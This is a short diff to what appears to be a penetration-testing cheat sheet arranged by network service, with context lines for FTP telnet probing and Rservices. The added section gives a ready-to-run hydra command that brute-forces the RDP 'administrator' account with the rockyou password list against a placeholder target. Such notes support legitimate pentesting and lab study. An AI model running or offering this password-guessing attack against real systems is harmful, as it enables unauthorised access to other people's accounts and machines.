@@ -25,6 +25,11 @@ telnet <target IP> 21
 AUTH test
 ------------------------------------------------------------------------------------------------------
 
+# Remote Desktop
+
+hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://targetIP
+------------------------------------------------------------------------------------------------------
+
 # Rservices
 
 513/tcp
